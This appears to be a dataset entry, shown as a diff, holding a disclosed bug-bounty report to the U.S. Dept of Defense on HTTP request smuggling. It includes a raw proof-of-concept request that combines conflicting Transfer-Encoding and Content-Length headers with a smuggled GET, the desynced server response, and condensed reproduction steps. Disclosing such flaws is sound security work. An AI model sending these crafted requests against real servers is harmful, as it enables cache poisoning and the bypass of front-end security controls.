@@ -1,0 +1,38 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "lu3ky-13 ",
+    "title": "HTTP Request Smuggling ",
+    "content": "\nhello dear support\nI have found HTTP Request Smuggling on www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nIssue description\nHTTP request smuggling vulnerabilities arise when websites route HTTP requests through webservers with inconsistent HTTP parsing.\nBy supplying a request that gets interpreted as being different lengths by different servers, an attacker can poison the back-end TCP/TLS socket and prepend arbitrary data to the next request. Depending on the website's functionality, this can be used to bypass front-end security rules, access internal systems, poison web caches, and launch assorted attacks on users who are actively browsing the site.\nImpact\nImpact\nan attacker can poison the TCP / TLS socket and add arbitrary data to the next request. Depending on the functionality of the website, this can be used to bypass front-end security rules, internal system access, poison the web cache, and launch various attacks on users who actively activate the site.\nReference: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn\nSystem Host(s)\nwww.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nhttp request\nCode 520 Bytes\n1GET /404 HTTP/1.1\n2Host: www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n5Accept-Language: en-GB,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n8Upgrade-Insecure-Requests: 1\n9Cache-Control: max-age=0\n10Content-Type: application/x-www-form-urlencoded\n11Transfer-Encoding: chunked\n12Content-Length: 118\n13Connection: keep-alive\n14\n150\n16\n17GET https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588 HTTP/1.1\n18Host: www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n19foo: x\nhttp response\nCode 1.21 KiB\n1HTTP/1.1 302 Found\n2Date: Tue, 09 Mar 2021 02:54:22 GMT\n3Server: Apache\n4Set-Cookie: \u2588\u2588\u2588=expiry=1615259062417257;Max-Age=600;path=/;httponly;secure;\n5X-Frame-Options: SAMEORIGIN\n6X-XSS-Protection: 1; mode=block\n7X-Content-Type-Options: nosniff\n8Strict-Transport-Security: max-age=31536000; includeSubDomains\n9Referrer-Policy: strict-origin\n10Location: https://www.\u2588\u2588\u2588\u2588/404_not_found.html\n11Content-Length: 236\n12Keep-Alive: timeout=5, max=100\n13Connection: Keep-Alive\n14Content-Type: text/html; charset=iso-8859-1\n15\n16<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n17<html><head>\n18<title>302 Found</title>\n19</head><body>\n20<h1>Found</h1>\n21<p>The document has moved <a href=\"https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/404_not_found.html\">here</a>.</p>\n22</body></html>\n23HTTP/1.1 200 OK\n24Date: Tue, 09 Mar 2021 02:54:22 GMT\n25Server: Apache\n26Set-Cookie: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=expiry=1615259062417962;Max-Age=600;path=/;httponly;secure;\n27X-Frame-Options: SAMEORIGIN\n28X-XSS-Protection: 1; mode=block\n29X-Content-Type-Options: nosniff\n30Strict-Transport-Security: max-age=31536000; includeSubDomains\n31Referrer-Policy: strict-origin\n32Cache-Control: no-cache, private\n33Last-Modified: Mon, 05 Mar 2012 16:45:37 GMT\n34ETag: \"78d0-4ba81a7e20e40\"\n35Accept-Ranges: bytes\n36Content-Length: 30928\n37Content-Type: image/png\n38\n39\u0089PNG\n40\u001a\n41\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "HTTP Request Smuggling"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1618961760,
+    "report_url": "https://hackerone.com/reports/1120982",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Send an HTTP request with both 'Transfer-Encoding: chunked' and 'Content-Length' headers to the target server."
+        ],
+        [
+            2,
+            "Observe the server's response to confirm if it processes the request inconsistently, indicating potential HTTP Request Smuggling."
+        ]
+    ],
+    "vuln_description": "HTTP Request Smuggling is a vulnerability that arises when a front-end server and a back-end server interpret HTTP requests differently, particularly in the handling of 'Transfer-Encoding' and 'Content-Length' headers. This inconsistency can allow an attacker to smuggle a request to the back-end server, potentially leading to cache poisoning, security bypasses, or other malicious activities.",
+    "reason": "The attack requires understanding of HTTP protocol nuances and the ability to craft requests that exploit parsing differences between servers. However, once the concept is understood, the execution is relatively straightforward, involving the manipulation of standard HTTP headers.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
